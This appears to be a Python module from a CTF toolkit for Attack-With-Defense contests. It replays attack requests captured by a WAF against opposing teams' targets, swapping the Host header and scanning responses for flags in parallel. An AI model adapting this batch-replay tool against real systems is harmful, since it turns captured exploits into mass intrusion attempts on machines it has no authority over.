"""漏洞重放：把 WAF 抓到的攻击请求，原样打回攻击目标。

用途：AWD 里发现对手打我们的 payload，往往对他自己的靶机同样有效——
抓一次、改个 Host、批量重放，是抢分最快的方式之一。
"""

from __future__ import annotations

import json
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin, urlparse

import requests
import urllib3

from .config import Config, Target
from .flag import extract_flags
from .util import pmap, trunc

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_UA = "Mozilla/5.0 (compatible; ctf-ops/replay)"


def build_request(vuln: Dict[str, Any], target: Target) -> Dict[str, Any]:
    base = (target.web or [f"http://{target.host}"])[0].rstrip("/")
    path = vuln.get("path") or "/"
    if path.startswith("http://") or path.startswith("https://"):
        url = path
    else:
        url = base + ("/" if not path.startswith("/") else "") + path
    headers = dict(vuln.get("headers") or {})
    # Host 必须换成目标自己的，否则路由/虚拟主机不认
    host = urlparse(url).netloc
    headers = {k: v for k, v in headers.items()
               if k.lower() not in ("host", "content-length", "connection")}
    headers["Host"] = host
    headers.setdefault("User-Agent", DEFAULT_UA)
    return {"method": (vuln.get("method") or "GET").upper(), "url": url,
            "headers": headers, "body": vuln.get("body") or ""}


def replay_one(cfg: Config, target: Target, vuln: Dict[str, Any],
               timeout: int = 10) -> Dict[str, Any]:
    t0 = time.time()
    req = build_request(vuln, target)
    sess = requests.Session()
    sess.trust_env = False
    sess.verify = False
    try:
        r = sess.request(req["method"], req["url"], headers=req["headers"],
                         data=(req["body"].encode() if req["body"] else None),
                         timeout=timeout, allow_redirects=False)
        text = r.text or ""
        flags = extract_flags(text, cfg, limit=5)
        # 404 说明目标没这个路径，不算命中；2xx/3xx 才算有响应
        hit = r.status_code < 400
        return {
            "vuln_id": vuln.get("id"), "name": vuln.get("name", ""),
            "target": target.name, "url": req["url"], "method": req["method"],
            "status": r.status_code, "length": len(text),
            "ok": hit, "flags": flags,
            "snippet": trunc(text, 600),
            "elapsed": round(time.time() - t0, 2),
        }
    except Exception as e:  # noqa: BLE001
        return {"vuln_id": vuln.get("id"), "name": vuln.get("name", ""),
                "target": target.name, "url": req["url"], "method": req["method"],
                "status": 0, "length": 0, "ok": False, "flags": [],
                "error": str(e), "snippet": "", "elapsed": round(time.time() - t0, 2)}
    finally:
        sess.close()


def replay_many(cfg: Config, vulns: List[Dict[str, Any]], targets: List[Target],
                workers: int = 6) -> List[Dict[str, Any]]:
    pairs = [(v, t) for v in vulns for t in targets]

    def one(pair):
        v, t = pair
        return replay_one(cfg, t, v)

    res = pmap(one, pairs, workers=max(1, min(workers, len(pairs))), label="replay")
    return [r if isinstance(r, dict) else
            {"ok": False, "error": repr(r), "target": "?", "vuln_id": 0}
            for r in res]
